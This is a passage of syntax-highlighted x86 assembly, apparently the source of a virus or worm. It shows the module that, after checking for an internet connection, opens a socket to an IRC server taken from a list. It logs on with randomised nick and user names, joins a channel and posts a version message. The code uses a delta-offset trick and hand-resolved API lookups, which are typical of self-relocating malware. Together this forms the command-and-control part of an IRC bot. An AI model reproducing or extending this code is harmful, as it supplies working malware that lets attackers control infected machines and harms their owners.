    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">GetPositionOfItem</span><span class="sc0">

    </span><span class="sc5">GetSizeOfItem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_ITEM_FROM_LIST</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IRC_LAUNCH</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 

    </span><span class="sc5">IRCLaunch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ircstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CreateIRCThread</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">CreateIRCThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ircthreadid</span><span class="sc4">]</span><span class="sc0">            
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IRC_THREAD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ircstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_LAUNCH</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IRC_THREAD</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

    </span><span class="sc5">IrcThreadEntryPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetIrcDelta</span><span class="sc0">

    </span><span class="sc5">GetIrcDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetIrcDelta</span><span class="sc0">

    </span><span class="sc5">GetWSock32Base</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_GETPROCADDRESS_API_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_WSOCK32_BASE_ADDRESS</span><span class="sc0">

    </span><span class="sc5">LoadWinInetDll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wininet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UserIsOffline</span><span class="sc0">

    </span><span class="sc5">FindConnectionApiAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AInternetGetConnectedState</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UserIsOffline</span><span class="sc0">

    </span><span class="sc5">CheckConnection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">UserIsOnline</span><span class="sc0">
 
    </span><span class="sc5">UserIsOffline</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASleep</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoadWinInetDll</span><span class="sc0">

    </span><span class="sc5">UserIsOnline</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mywsadata</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWSAStartup</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc5">OpenSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Asocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">GetSocketValues</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket.sin_family</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">servers</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">server1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_ITEM_FROM_LIST</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">GetPort</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">port1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ahtons</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket.sin_port</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ainet_addr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket.sin_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">Connect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Aconnect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Connect</span><span class="sc0">

    </span><span class="sc5">LogonToIrcServer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LOGON</span><span class="sc0">

    </span><span class="sc5">DoTheLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_RECEIVE</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseSocket</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DoTheLoop</span><span class="sc0">
    
    </span><span class="sc5">CloseSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Aclosesocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc5">WSACleanUp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWSACleanup</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
                                         
    </span><span class="sc5">ExitThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_THREAD</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">LOGON</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_RECEIVE</span><span class="sc0">

    </span><span class="sc5">SendNick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nick</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">name1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">names</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_ITEM_FROM_LIST</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_RECEIVE</span><span class="sc0">

    </span><span class="sc5">SendUser</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CREATE_RANDOM_NAME</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_RECEIVE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_RECEIVE</span><span class="sc0">
    
    </span><span class="sc5">SendJoin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">join</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">

    </span><span class="sc5">PostVersionMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.PostVersion</span><span class="sc0">

    </span><span class="sc5">LogonDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LOGON</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IRC_RECEIVE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ARecv</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SCANBUFFER</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_RECEIVE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IRC_SEND</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; esi = snd buffer</span><span class="sc0">
    </span><span class="sc1">; ecx = size to send</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_SEND</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">.PostVersion</span><span class="sc4">:</span><span class="sc0">
